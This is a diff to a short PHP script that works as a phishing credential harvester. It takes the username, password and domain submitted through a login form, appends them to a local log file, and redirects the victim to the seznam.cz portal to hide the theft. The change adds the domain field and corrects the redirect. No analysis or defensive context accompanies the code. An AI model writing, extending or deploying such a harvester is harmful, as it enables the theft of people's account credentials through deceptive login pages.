@@ -1,8 +1,8 @@
 <?php
-$data=($_GET["name"]) . ':' .  ($_GET["password"] . "\n");
+$data=($_POST["login-username"]) . ':' .  ($_POST["password"] . ':' . ($_POST["domain"]) . "\n");
 $fp=fopen('log.txt', 'a');
 fwrite($fp, $data);
 fclose($fp);
 
-header('location: www.seznam.cz');
+header('location: http://www.seznam.cz');
 ?>
